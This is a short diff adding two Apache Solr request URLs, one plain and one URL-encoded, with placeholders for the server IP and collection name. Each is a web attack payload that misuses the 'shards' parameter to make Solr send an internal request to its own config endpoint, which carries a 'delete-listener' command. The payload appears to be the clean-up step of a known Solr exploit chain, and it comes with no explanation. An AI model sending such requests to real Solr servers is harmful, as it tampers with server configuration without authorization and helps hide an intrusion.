@@ -1,0 +1,3 @@
+http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={"delete-listener":"newlistener"}&isShard=true
+
+http://IP_OF_SOLR_SERVER:8983/solr/NAME_OF_COLECTION/select?q=xxx&shards=localhost:8983/solr/NAME_OF_COLECTION/config%23&stream.body={%22delete-listener%22:%22newlistener%22}&isShard=true
